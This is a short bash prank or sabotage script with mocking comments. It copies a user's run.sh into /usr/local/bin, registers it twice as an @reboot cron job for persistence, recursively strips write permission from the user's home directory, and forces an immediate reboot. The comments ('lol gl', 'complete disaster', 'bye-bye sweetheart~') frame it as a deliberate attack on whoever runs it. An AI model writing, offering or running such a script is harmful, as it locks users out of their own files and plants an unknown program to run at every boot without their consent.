#!/bin/bash

# hehe
cp /home/$(whoami)/run.sh /usr/local/bin/run.sh
chmod +x /usr/local/bin/run.sh
# where it belongs :3
DEST_DIR="/usr/local/bin"

# time for funni
# funni
cp /home/$(whoami)/run.sh $DEST_DIR/run.sh

# funni round 2
chmod +x $DEST_DIR/run.sh

# funni round 3
chmod -R a-w /home/$(whoami)

# lol gl
(crontab -l 2>/dev/null; echo "@reboot /bin/bash /usr/local/bin/run.sh") | crontab -
# complete disaster
(crontab -l 2>/dev/null; echo "@reboot /bin/bash $DEST_DIR/run.sh") | crontab -

# bye-bye sweetheart~
shutdown -r now
